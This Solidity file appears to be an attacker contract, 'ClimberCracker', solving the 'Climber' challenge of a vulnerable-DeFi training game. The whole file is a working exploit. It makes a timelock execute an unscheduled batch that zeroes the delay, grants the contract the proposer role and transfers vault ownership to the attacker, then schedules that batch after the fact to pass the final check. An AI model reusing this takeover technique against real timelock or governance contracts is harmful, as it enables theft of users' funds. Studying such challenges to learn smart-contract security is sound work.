// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import "./ClimberVault.sol";
import "./ClimberTimelock.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITimeLock {
    function execute(     
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function updateDelay(uint64 newDelay) external;
    function grantRole(bytes32 role,address to) external; 
}

interface IClimberVault{
    function upgradeTo(address newImplementation) external;
    function transferOwnership(address newOwner) external;
}

interface INewClimber{
    function withdraw(address tokenAddress, address recipient) external;
}

contract ClimberCracker {

    address public attacker;

    ITimeLock private TimeLock;
    IClimberVault private ClimberVaultInstance;
    IERC20 private dvt;

    address[] private targets;
    uint256[] private values;
    bytes[]   private payloads;
    bytes32   private salt; 

    constructor(address _dvt, address _climberVault, address _timeLock){
        dvt = IERC20(_dvt);
        ClimberVaultInstance = IClimberVault(_climberVault);
        TimeLock = ITimeLock(_timeLock);
        attacker = msg.sender;
    }

    function firstExecutionSet() public {
        require(msg.sender == attacker, "!attacker");

        // We will perform the following actions first.
        // Then in order to have the transaction mined, the last execution
        // must be the scheduling of each one.

        // 1. Changing the delay
        // Allows us to schedule several actions at once.
        bytes memory delayPayload = abi.encodeWithSelector(TimeLock.updateDelay.selector,
            uint64(0)
        );
        // Enqueuing the execution parameters.
        targets.push(address(TimeLock)); // The function resides in the TimeLock contract
        values.push(0); // 0 Ether
        payloads.push(delayPayload); // We want to call updateDelay

        // 2. Once the delay is modified, we need to get the proposer role for this contract.
        // Allows us to propose and schedule new actions.
        bytes memory proposerPayload = abi.encodeWithSelector(TimeLock.grantRole.selector,
            keccak256("PROPOSER_ROLE"),
            address(this)
        );
        // Enqueuing the execution parameters.
        targets.push(address(TimeLock)); // The function resides in the TimeLock contract
        values.push(0); // 0 Ether
        payloads.push(proposerPayload); // We want to call grantRole

        // 3. We can also steal the ownership of the vault.
        // Helps us push further proxy implementation updates.
        bytes memory ownershipPayload = abi.encodeWithSelector(ClimberVaultInstance.transferOwnership.selector,
            attacker
        );
        // Enqueuing the execution parameters.
        targets.push(address(ClimberVaultInstance)); // The function resides in the ClimberVault contract
        values.push(0); // 0 Ether
        payloads.push(ownershipPayload); // We want to call grantRole

        // 4. We also need to loop over all the last instructions and schedule them.
        // Thanks to the poorly require statement, we can (and must) add them
        // into the schedule book in order to have the transaction mined.
        bytes memory schedulePayload = abi.encodeWithSignature("scheduleAll()");
        targets.push(address(this));
        values.push(0);
        payloads.push(schedulePayload);

        salt = keccak256("9-12-2018"); // This can be anything, just a nonsense random num...

        TimeLock.execute(targets, values, payloads, salt);
    }

    function scheduleAll() external {
        TimeLock.schedule(targets, values, payloads, salt);
    }

}